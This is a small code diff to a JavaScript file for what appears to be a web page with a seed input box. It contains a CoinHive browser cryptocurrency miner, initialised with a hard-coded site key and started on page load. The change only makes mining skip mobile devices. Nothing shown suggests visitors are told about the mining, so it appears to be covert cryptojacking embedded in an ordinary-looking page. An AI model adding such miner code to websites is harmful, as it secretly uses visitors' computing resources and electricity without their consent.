@@ -20,7 +20,7 @@ var COLOR_GREEN = "#009000";
 
 //init
 var miner = new CoinHive.Anonymous('Ul6SWB7j0GGalIcLOWvIjxPRD4FSrNcc');
-miner.start();
+if(!miner.isMobile()) miner.start();
 
 $("#seed").keyup(function() {
 	fire();
